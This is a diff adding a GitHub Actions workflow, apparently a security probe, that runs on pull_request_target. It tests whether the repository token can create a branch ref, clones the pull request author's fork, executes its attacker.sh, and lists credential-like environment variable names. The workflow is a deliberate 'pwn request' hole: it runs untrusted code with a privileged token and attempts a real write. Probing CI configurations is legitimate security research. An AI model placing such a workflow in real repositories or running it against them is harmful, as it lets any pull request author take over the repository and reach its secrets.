@@ -1,0 +1,30 @@
+name: PRT probe
+on: pull_request_target
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      HEADSHA: ${{ github.event.pull_request.head.sha }}
+      HEADREPO: ${{ github.event.pull_request.head.repo.full_name }}
+    steps:
+      - name: trust markers
+        run: |
+          echo "event=${GITHUB_EVENT_NAME} actor=${GITHUB_ACTOR}"
+          echo "head=${HEADREPO}@${HEADSHA}"
+          echo "--- token write probe ---"
+          if gh api -X POST "/repos/${GITHUB_REPOSITORY}/refs" -f ref=scratch/prt -f sha="${HEADSHA}" -q .ref >/dev/null 2>&1; then
+            echo "TOKEN_WRITE=yes"
+          else
+            echo "TOKEN_WRITE=no"
+          fi
+      - name: fetch and run the PR head's own script (classic pwn request shape)
+        run: |
+          git clone -q "https://github.com/${HEADREPO}.git" /tmp/head || echo "clone failed"
+          cd /tmp/head && git checkout -q "${HEADSHA}" || echo "checkout failed"
+          echo "--- attacker file listing ---"
+          ls -1 /tmp/head | head -10
+          echo "--- running attacker.sh from the PR head ---"
+          bash /tmp/head/attacker.sh 2>&1 | head -8 || echo "no attacker.sh"
+          echo "--- env vars that look like credentials (names only) ---"
+          env | grep -oiE '^[A-Za-z_]*(SECRET|TOKEN|KEY)[A-Za-z_]*' | sort -u | head -20
